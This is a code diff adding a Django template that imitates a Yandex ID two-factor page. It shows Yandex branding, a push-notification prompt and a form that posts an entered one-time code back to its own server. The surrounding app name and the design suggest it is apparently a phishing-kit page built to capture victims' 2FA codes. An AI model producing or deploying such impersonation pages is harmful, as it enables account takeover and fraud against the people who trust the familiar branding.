@@ -1,0 +1,192 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/yanlo.png' %}" />
+
+  <title>Yandex ID - 2FA</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .container {
+      /* max-width: 400px;
+      margin: 0 auto; */
+ width: 30%;
+      margin: 0 auto;
+      text-align: center;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    height: 70vh;
+    display: flex;
+    justify-content: center;
+    justify-items: center;
+    align-items: center;
+    flex-direction: column;
+
+    }
+
+    .logo {
+      font-weight: bold;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      margin-bottom: 5px;
+      font-weight: bold;
+      width: 80%;
+    }
+
+    .description {
+      color: #777;
+      font-size: 14px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .notification {
+      background: #f5f6fa;
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+    }
+
+    .notification-icon {
+      color: #fbbf24;
+      font-size: 20px;
+    }
+
+    .code-input {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      border: 2px solid black;
+      border-radius: 10px;
+      padding: 8px;
+      width: 70%;
+      
+
+    }
+
+    .code-input input {
+      width: 20%;
+      height: 26px;
+      font-size: 24px;
+      text-align: center;
+      outline: none;
+      border: none;
+      border-bottom: 2px solid #1a1717f8;
+
+      
+      /* border-radius: 10px; */
+    }
+
+    .btn {
+      width: 80%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      background-color: #111;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    form
+    {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      justify-self: center;
+    }
+    .get-new {
+      color: #999;
+      font-size: 14px;
+    }
+
+    .logo {
+  font-size: 20px;
+  font-weight: bold;
+  margin-bottom: 2vh;
+}
+
+.pill {
+  background-color: #111;
+  color: white;
+  padding: 2px 8px;
+  border-radius: 8px;
+  font-size: 14px;
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- <div class="logo">Yandex <span style="border:1px solid #111;border-radius:5px;padding:2px 6px;">ID</span></div> -->
+     <div class="logo">Yandex <span class="pill">ID</span></div>
+    <div class="subtitle">Enter the code from the push notification Yandex Mail📩</div>
+    <div class="description">Sent to all devices with Yandex apps</div>
+
+    <div class="notification">
+      <span class="notification-icon">🔔</span>
+      <div>
+        <strong>Check your push notifications</strong><br />
+        The code was sent by one of the Yandex apps
+      </div>
+    </div>
+<form action="" method="POST">
+
+    {% csrf_token %}
+    <div class="code-input">
+      <!-- <input maxlength="1" type="text" />
+      <input maxlength="1" type="text" />
+      <input maxlength="1" type="text" /> -->
+      <input maxlength="4" name='code' type="text" />
+    </div>
+
+    <button class="btn">Next</button>
+</form>
+
+    <div class="get-new">Get a new code <span id="timer">00:10</span></div>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll(".code-input input");
+
+    inputs.forEach((input, idx) => {
+      input.addEventListener("input", () => {
+        if (input.value && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+    });
+
+    // Timer countdown
+    let seconds = 10;
+    const timerEl = document.getElementById("timer");
+
+    const timer = setInterval(() => {
+      seconds--;
+      timerEl.textContent = `00:${seconds.toString().padStart(2, "0")}`;
+      if (seconds <= 0) clearInterval(timer);
+    }, 1000);
+  </script>
+</body>
+</html>
+
